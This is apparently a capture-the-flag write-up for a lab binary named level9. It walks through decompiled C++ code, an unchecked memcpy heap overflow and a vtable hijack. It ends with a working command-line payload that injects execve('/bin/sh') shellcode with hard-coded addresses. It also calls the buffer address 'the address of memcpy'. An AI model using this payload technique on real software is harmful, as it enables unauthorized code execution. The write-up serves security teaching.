Here is the decompiled code :

```c
void main(int param_1,int param_2)

{
  N *this;
  N *this_00;
  
  if (param_1 < 2) {
                    /* WARNING: Subroutine does not return */
    _exit(1);
  }
  this = (N *)operator.new(0x6c);
  N::N(this,5);
  this_00 = (N *)operator.new(0x6c);
  N::N(this_00,6);
  N::setAnnotation(this,*(char **)(param_2 + 4));
  (*(code *)**(undefined4 **)this_00)(this_00,this);
  return;
}
```

We have a N class :

```c
void __thiscall N::N(N *this,int param_1)

{
  *(undefined ***)this = &PTR_operator+_08048848;
  *(int *)(this + 0x68) = param_1;
  return;
}

/* N::setAnnotation(char*) */

void __thiscall N::setAnnotation(N *this,char *param_1)

{
  size_t __n;

  __n = strlen(param_1);
  memcpy(this + 4,param_1,__n);
  return;
}
```

In the main function, `N::setAnnotation` is called, which contains a call to `memcpy()` which is vulnerable to overflow.

With the memcpy we do with the first N object, we will do a vtable hijack exploit, which means we will overwrite its vtable so that when it will call a method, the address will point to our malicious code.

So just after the offset of our buffer, we input the address of the new memcpy() which can be found with `ltrace`.

Address of memcpy() : 0x0804a00c
Offset : 108
Shellcode : `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80` (found here : https://shell-storm.org/shellcode/files/shellcode-811.html)

However the hijacked vtable needs an address for its method, and we want to execute the shellcode we just memcpy'ied so we input the address of the new memcpy at the begining of our input. However since we added 4 bytes, we must offset it by 4.

Payload will look something like this :
`[ addr of the begining of shellcode ] + [ shellcode ] + [ padding ] + [ addr of memcpy ]`

Result : `./level9 $(python -c 'print("\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\x04\x08")')`
